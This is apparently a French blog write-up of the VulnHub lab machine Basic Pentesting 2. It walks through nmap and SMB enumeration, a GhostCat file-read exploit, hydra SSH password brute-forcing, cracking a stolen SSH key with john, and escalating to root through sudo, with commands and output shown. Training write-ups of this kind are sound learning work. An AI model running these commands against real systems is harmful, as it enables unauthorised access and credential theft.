---
title: "Write-up | Basic Pentesting: 2"
date: 2020-07-10T16:32:18+02:00
draft: false
tags:
  - writeup
  - vulnhub

---

Ce write-up couvrira la machine basic_pentesting_2, dont le .ova est trouvable sur [VulnHub](https://www.vulnhub.com/).

## Reconnaissance
```
$ nmap -sV -sC 192.168.1.220 -oN scans/ports.txt
...
PORT     STATE SERVICE     VERSION
22/tcp   open  ssh         OpenSSH 7.2p2 Ubuntu 4ubuntu2.4 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 db:45:cb:be:4a:8b:71:f8:e9:31:42:ae:ff:f8:45:e4 (RSA)
|   256 09:b9:b9:1c:e0:bf:0e:1c:6f:7f:fe:8e:5f:20:1b:ce (ECDSA)
|_  256 a5:68:2b:22:5f:98:4a:62:21:3d:a2:e2:c5:a9:f7:c2 (ED25519)
80/tcp   open  http        Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
139/tcp  open  netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp  open  netbios-ssn Samba smbd 4.3.11-Ubuntu (workgroup: WORKGROUP)
8009/tcp open  ajp13       Apache Jserv (Protocol v1.3)
| ajp-methods: 
|_  Supported methods: GET HEAD POST OPTIONS
8080/tcp open  http        Apache Tomcat 9.0.7
|_http-favicon: Apache Tomcat
|_http-title: Apache Tomcat/9.0.7
Service Info: Host: BASIC2; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Ça me dit quelque chose (cf [ce write-up](https://blog.hugoblanc.com/posts/tomghost-writeup/)). :)

Je vais faire un coup de `gobuster` avant de passer à la phase d'exploitation.
```
$ gobuster dir -u 192.168.1.220 -w /usr/share/wordlists/dirb/big.txt -o scans/dirs.txt
/.htaccess (Status: 403)
/.htpasswd (Status: 403)
/development (Status: 301)
/server-status (Status: 403)
```

On a donc un directory nommé `/development`. Il contient deux ficher .txt :
* `dev.txt` :
```
2018-04-23: I've been messing with that struts stuff, and it's pretty cool! I think it might be neat to host that on this server too.
Haven't made any real web apps yet, but I have tried that example you get to show off how it works (and it's the REST version of the example!).
Oh, and right now I'm using version 2.5.12, because other versions were giving me trouble. -K

2018-04-22: SMB has been configured. -K

2018-04-21: I got Apache set up. Will put in our content later. -J
```
* `j.txt`
```
For J:

I've been auditing the contents of /etc/shadow to make sure we don't have any weak credentials,
and I was able to crack your hash really easily. You know our password policy, so please follow
it? Change that password ASAP.

-K
```
Bon, on sait que les mots de passe dans `/etc/shadow` sont assez faibles. On sait également que les dévelopeurs utilisent Apache Struts en version 2.5.12. Une rapide recherche sur google m'amène à la [CVE-2017-9805](https://www.cvedetails.com/cve/CVE-2017-9805/). Cette version de Apache Struts a une vulnérabilité de type RCE. Cool :)

SMB tournant également sur la machine, j'utilise `enum4linux` afin de voir si je peux récupérer quelques précieuses informations : 
```
$ enum4linux 192.168.1.220
...
 ======================================================================== 
|    Users on 192.168.1.220 via RID cycling (RIDS: 500-550,1000-1050)    |
 ======================================================================== 
[I] Found new SID: S-1-22-1
[I] Found new SID: S-1-5-21-2853212168-2008227510-3551253869
[I] Found new SID: S-1-5-32
[+] Enumerating users using SID S-1-22-1 and logon username '', password ''
S-1-22-1-1000 Unix User\kay (Local User)
S-1-22-1-1001 Unix User\jan (Local User)
...
```
Nous avons donc les noms des utilisateurs de la machine : kay et jan.

## Exploitation

Tout d'abord, je veux essayer de voir ce que je peux faire avec la vulnérabilité de Apache Tomcat :
```
$ python3 exploit.py http://192.168.1.220:8080 8009 /WEB-INF/web.xml read
...
<web-app xmlns="http://xmlns.jcp.org/xml/ns/javaee"
  xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance"
  xsi:schemaLocation="http://xmlns.jcp.org/xml/ns/javaee
                      http://xmlns.jcp.org/xml/ns/javaee/web-app_4_0.xsd"
  version="4.0"
  metadata-complete="true">

  <display-name>Welcome to Tomcat</display-name>
  <description>
     Welcome to Tomcat
  </description>

</web-app>
```
Cette machine est donc bien vulnérable à GhostCat. L'_exploit_ utilisé est trouvable [ici](https://github.com/00theway/Ghostcat-CNVD-2020-10487/blob/master/ajpShooter.py).

Contrairement à mon write-up qui couvrait cette vulnérabilité, ici les credentials ne sont pas donnés dans le fichier `/WEB-INF/web.xml`.

Je reviendrai explorer cette piste plus tard si besoin, j'ai envie d'essayer autre chose.

Dans le fichier `j.txt`, Kay (alias K) reproche à Jan (alias J) d'avoir un mot de passe faible.
Il est donc peut-être possible de bruteforcer le mot de passe SSH de Jan avec `hydra`. 
```
$ hydra -l jan -P /usr/share/wordlists/rockyou.txt 192.168.1.220 ssh
...
[DATA] attacking ssh://192.168.1.220:22/
[22][ssh] host: 192.168.1.220   login: jan   password: [edited]
1 of 1 target successfully completed, 1 valid password found
```

Ça a marché :)

Je peux donc me connecter en SSH en tant que jan. Même si il n'y a pas de flags à capturer dans cette box, l'objectif est de passer root.

## Élévation de privilèges

Le traditionnel `sudo-l` ne me donne aucun résultat.
```
$ sudo -l
[sudo] password for jan: 
Sorry, user jan may not run sudo on basic2.
```
J'essaie alors de voir si je peux abuser du bit SUID de certains exécutables (cf [ici](https://blog.hugoblanc.com/posts/privesc-bit-suid/)) :
```
$ find / -perm /4000 2> /dev/null
/usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
/usr/lib/policykit-1/polkit-agent-helper-1
/usr/lib/eject/dmcrypt-get-device
/usr/lib/snapd/snap-confine
/usr/lib/openssh/ssh-keysign
/usr/lib/dbus-1.0/dbus-daemon-launch-helper
/usr/bin/vim.basic
/usr/bin/pkexec
/usr/bin/newgrp
/usr/bin/chfn
/usr/bin/sudo
/usr/bin/chsh
/usr/bin/newgidmap
/usr/bin/at
/usr/bin/gpasswd
/usr/bin/newuidmap
/usr/bin/passwd
/bin/su
/bin/ntfs-3g
/bin/ping6
/bin/umount
/bin/fusermount
/bin/mount
/bin/ping
```
Il n'y a rien qui me parle ici...

Cependant, en cherchant un peu, on voit qu'on a accès au dossier `/home/kay/.ssh` :
```
$ ls -l /home/kay/.ssh/
total 12
-rw-rw-r-- 1 kay kay  771 Apr 23  2018 authorized_keys
-rw-r--r-- 1 kay kay 3326 Apr 19  2018 id_rsa
-rw-r--r-- 1 kay kay  771 Apr 19  2018 id_rsa.pub
```
On peut également lire le fichier `id_rsa`, ce qui est plutôt cool ! Une fois récupéré, je le passe à `ssh2john` puis à `john` pour casser le mot de passe :
```
$ /usr/share/john/ssh2john.py id_rsa > hashssh
$ sudo john hashssh --wordlist=/usr/share/wordlists/rockyou.txt 
...
Press 'q' or Ctrl-C to abort, almost any other key for status
[edited]          (id_rsa)
...
Session completed
```
Super, on peut maintenant se connecter en SSH en tant que kay !
```
$ sudo ssh -i id_rsa kay@192.168.1.220
[sudo] Mot de passe de ezekiel: 
load pubkey "id_rsa": invalid format
Enter passphrase for key 'id_rsa': 
Welcome to Ubuntu 16.04.4 LTS (GNU/Linux 4.4.0-119-generic x86_64)
...
```
Une fois connecté, je lis le fichier `pass.bak` dans son repertoire :
```
$ ls
pass.bak
$ cat pass.bak 
[edited]
```
Vu que nous avons son mot de passe, nous pouvons enfin faire `sudo -l` :
```
$ sudo -l
[sudo] password for kay: 
...
User kay may run the following commands on basic2:
    (ALL : ALL) ALL
```
et au vu du résultat, passer root :
```
$ sudo su
# whoami
root
```

C'est dans la poche ! :)
